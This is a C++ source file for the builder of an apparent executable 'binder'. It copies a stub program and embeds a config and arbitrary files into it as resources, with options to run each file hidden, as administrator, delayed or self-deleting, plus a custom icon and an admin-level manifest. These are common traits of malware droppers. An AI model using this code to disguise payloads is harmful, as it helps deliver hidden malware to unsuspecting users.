// TorGames.Binder - Builder engine implementation
#include "Builder.h"
#include "../utils/utils.h"

Builder::Builder() {
}

Builder::~Builder() {
}

void Builder::SetConfig(const BinderConfig& config) {
    m_config = config;
}

std::string Builder::GetStubPath() const {
    // Look for stub in same directory as binder executable
    std::string exeDir = Utils::GetExecutableDirectory();
    return exeDir + "\\TorGames.Binder.Stub.exe";
}

bool Builder::CopyStub(const std::string& outputPath, std::string& errorMsg) {
    std::string stubPath = GetStubPath();

    if (!Utils::FileExists(stubPath.c_str())) {
        errorMsg = "Stub executable not found: " + stubPath;
        return false;
    }

    if (!CopyFileA(stubPath.c_str(), outputPath.c_str(), FALSE)) {
        errorMsg = "Failed to copy stub to output location";
        return false;
    }

    return true;
}

std::string Builder::SerializeConfig() const {
    // Compact JSON serialization (no extra whitespace for reliable parsing)
    std::string json = "{";
    json += "\"configVersion\":" + std::to_string(m_config.configVersion) + ",";
    json += "\"requireAdmin\":" + std::string(m_config.requireAdmin ? "true" : "false") + ",";
    json += "\"files\":[";

    for (size_t i = 0; i < m_config.files.size(); i++) {
        const auto& f = m_config.files[i];
        json += "{";
        json += "\"filename\":\"" + f.filename + "\",";
        json += "\"executionOrder\":" + std::to_string(f.executionOrder) + ",";
        json += "\"executeFile\":" + std::string(f.executeFile ? "true" : "false") + ",";
        json += "\"waitForExit\":" + std::string(f.waitForExit ? "true" : "false") + ",";
        json += "\"runHidden\":" + std::string(f.runHidden ? "true" : "false") + ",";
        json += "\"runAsAdmin\":" + std::string(f.runAsAdmin ? "true" : "false") + ",";

        // Escape backslashes in paths
        std::string extractPath = f.extractPath;
        for (size_t p = 0; p < extractPath.length(); p++) {
            if (extractPath[p] == '\\') {
                extractPath.insert(p, "\\");
                p++;
            }
        }
        json += "\"extractPath\":\"" + extractPath + "\",";
        json += "\"commandLineArgs\":\"" + f.commandLineArgs + "\",";
        json += "\"executionDelay\":" + std::to_string(f.executionDelay) + ",";
        json += "\"deleteAfterExecution\":" + std::string(f.deleteAfterExecution ? "true" : "false") + ",";
        json += "\"fileSize\":" + std::to_string(f.fileSize);
        json += "}";
        if (i < m_config.files.size() - 1) {
            json += ",";
        }
    }

    json += "]}";

    return json;
}

bool Builder::EmbedConfig(const std::string& exePath, std::string& errorMsg) {
    std::string configJson = SerializeConfig();

    HANDLE hUpdate = BeginUpdateResourceA(exePath.c_str(), FALSE);
    if (!hUpdate) {
        errorMsg = "Failed to begin resource update for config. Error: " + std::to_string(GetLastError());
        return false;
    }

    // UpdateResource params: hUpdate, lpType, lpName, wLanguage, lpData, cb
    // Note: FindResource uses (hModule, lpName, lpType) - different order!
    BOOL success = UpdateResourceA(
        hUpdate,
        MAKEINTRESOURCEA(RT_BINDER_CONFIG),  // lpType = 256
        MAKEINTRESOURCEA(1),                  // lpName = 1
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        (LPVOID)configJson.c_str(),
        (DWORD)configJson.length()
    );

    if (!success) {
        DWORD err = GetLastError();
        EndUpdateResourceA(hUpdate, TRUE); // Discard changes
        errorMsg = "Failed to update config resource. Error: " + std::to_string(err);
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        errorMsg = "Failed to finalize config resource update. Error: " + std::to_string(GetLastError());
        return false;
    }

    return true;
}

bool Builder::EmbedFile(const std::string& exePath, int resourceId, const std::string& filePath, std::string& errorMsg) {
    std::vector<BYTE> fileData = Utils::LoadFileToMemory(filePath.c_str());
    if (fileData.empty()) {
        errorMsg = "Failed to load file: " + filePath;
        return false;
    }

    HANDLE hUpdate = BeginUpdateResourceA(exePath.c_str(), FALSE);
    if (!hUpdate) {
        errorMsg = "Failed to begin resource update for file";
        return false;
    }

    BOOL success = UpdateResourceA(
        hUpdate,
        MAKEINTRESOURCEA(RT_BINDER_FILE),
        MAKEINTRESOURCEA(resourceId),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        fileData.data(),
        (DWORD)fileData.size()
    );

    if (!success) {
        EndUpdateResourceA(hUpdate, TRUE); // Discard changes
        errorMsg = "Failed to update file resource: " + filePath;
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        errorMsg = "Failed to finalize file resource update";
        return false;
    }

    return true;
}

bool Builder::UpdateIcon(const std::string& exePath, const std::string& iconPath, std::string& errorMsg) {
    if (iconPath.empty()) {
        return true; // No icon to update
    }

    if (!Utils::FileExists(iconPath.c_str())) {
        errorMsg = "Icon file not found: " + iconPath;
        return false;
    }

    // Icon updating is complex - requires parsing ICO format and updating
    // RT_GROUP_ICON and RT_ICON resources. For simplicity, we'll use a
    // basic approach that works for single-image ICO files.

    std::vector<BYTE> iconData = Utils::LoadFileToMemory(iconPath.c_str());
    if (iconData.size() < 22) { // Minimum ICO header size
        errorMsg = "Invalid icon file";
        return false;
    }

    // ICO file format:
    // ICONDIR (6 bytes) + ICONDIRENTRY[] (16 bytes each)
    // followed by image data

    WORD reserved = *(WORD*)&iconData[0];
    WORD type = *(WORD*)&iconData[2];
    WORD count = *(WORD*)&iconData[4];

    if (reserved != 0 || type != 1) {
        errorMsg = "Invalid icon file format";
        return false;
    }

    HANDLE hUpdate = BeginUpdateResourceA(exePath.c_str(), FALSE);
    if (!hUpdate) {
        errorMsg = "Failed to begin resource update for icon";
        return false;
    }

    // For each icon in the file
    BYTE* ptr = &iconData[6];
    std::vector<BYTE> grpIconDir;

    // Build GRPICONDIR header
    grpIconDir.push_back(0); grpIconDir.push_back(0); // Reserved
    grpIconDir.push_back(1); grpIconDir.push_back(0); // Type (icon)
    grpIconDir.push_back((BYTE)count); grpIconDir.push_back(0); // Count

    for (WORD i = 0; i < count; i++) {
        BYTE width = ptr[0];
        BYTE height = ptr[1];
        BYTE colorCount = ptr[2];
        BYTE reserved2 = ptr[3];
        WORD planes = *(WORD*)&ptr[4];
        WORD bitCount = *(WORD*)&ptr[6];
        DWORD bytesInRes = *(DWORD*)&ptr[8];
        DWORD imageOffset = *(DWORD*)&ptr[12];

        // Add RT_ICON resource
        if (imageOffset + bytesInRes <= iconData.size()) {
            UpdateResourceA(hUpdate,
                RT_ICON,
                MAKEINTRESOURCEA(i + 1),
                MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                &iconData[imageOffset],
                bytesInRes);
        }

        // Add entry to GRPICONDIR (14 bytes each, with nId instead of offset)
        grpIconDir.push_back(width);
        grpIconDir.push_back(height);
        grpIconDir.push_back(colorCount);
        grpIconDir.push_back(reserved2);
        grpIconDir.push_back((BYTE)(planes & 0xFF));
        grpIconDir.push_back((BYTE)((planes >> 8) & 0xFF));
        grpIconDir.push_back((BYTE)(bitCount & 0xFF));
        grpIconDir.push_back((BYTE)((bitCount >> 8) & 0xFF));
        grpIconDir.push_back((BYTE)(bytesInRes & 0xFF));
        grpIconDir.push_back((BYTE)((bytesInRes >> 8) & 0xFF));
        grpIconDir.push_back((BYTE)((bytesInRes >> 16) & 0xFF));
        grpIconDir.push_back((BYTE)((bytesInRes >> 24) & 0xFF));
        WORD nId = i + 1;
        grpIconDir.push_back((BYTE)(nId & 0xFF));
        grpIconDir.push_back((BYTE)((nId >> 8) & 0xFF));

        ptr += 16;
    }

    // Update RT_GROUP_ICON resource
    UpdateResourceA(hUpdate,
        RT_GROUP_ICON,
        MAKEINTRESOURCEA(1),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        grpIconDir.data(),
        (DWORD)grpIconDir.size());

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        errorMsg = "Failed to finalize icon resource update";
        return false;
    }

    return true;
}

bool Builder::UpdateManifest(const std::string& exePath, bool requireAdmin, std::string& errorMsg) {
    const char* manifestTemplate = R"(<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="%s" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
      <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
      <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
      <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/>
    </application>
  </compatibility>
</assembly>)";

    char manifest[2048];
    snprintf(manifest, sizeof(manifest), manifestTemplate,
             requireAdmin ? "requireAdministrator" : "asInvoker");

    HANDLE hUpdate = BeginUpdateResourceA(exePath.c_str(), FALSE);
    if (!hUpdate) {
        errorMsg = "Failed to begin resource update for manifest";
        return false;
    }

    BOOL success = UpdateResourceA(
        hUpdate,
        RT_MANIFEST,
        MAKEINTRESOURCEA(1),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        manifest,
        (DWORD)strlen(manifest)
    );

    if (!success) {
        EndUpdateResourceA(hUpdate, TRUE);
        errorMsg = "Failed to update manifest resource";
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        errorMsg = "Failed to finalize manifest resource update";
        return false;
    }

    return true;
}

bool Builder::Build(const std::string& outputPath, std::string& errorMsg) {
    // Validate configuration
    if (m_config.files.empty()) {
        errorMsg = "No files to bind";
        return false;
    }

    // Verify all source files exist
    for (const auto& file : m_config.files) {
        if (!Utils::FileExists(file.fullPath.c_str())) {
            errorMsg = "Source file not found: " + file.fullPath;
            return false;
        }
    }

    // Step 1: Copy stub to output
    if (!CopyStub(outputPath, errorMsg)) {
        return false;
    }

    // Step 2: Embed configuration
    if (!EmbedConfig(outputPath, errorMsg)) {
        DeleteFileA(outputPath.c_str());
        return false;
    }

    // Step 3: Embed each file
    int resourceId = 1;
    for (const auto& file : m_config.files) {
        if (!EmbedFile(outputPath, resourceId, file.fullPath, errorMsg)) {
            DeleteFileA(outputPath.c_str());
            return false;
        }
        resourceId++;
    }

    // Step 4: Update icon if specified
    if (!m_config.customIcon.empty()) {
        if (!UpdateIcon(outputPath, m_config.customIcon, errorMsg)) {
            // Non-fatal - just warn
            MessageBoxA(NULL, errorMsg.c_str(), "Icon Warning", MB_OK | MB_ICONWARNING);
        }
    }

    // Step 5: Update manifest for admin requirement
    if (!UpdateManifest(outputPath, m_config.requireAdmin, errorMsg)) {
        DeleteFileA(outputPath.c_str());
        return false;
    }

    return true;
}
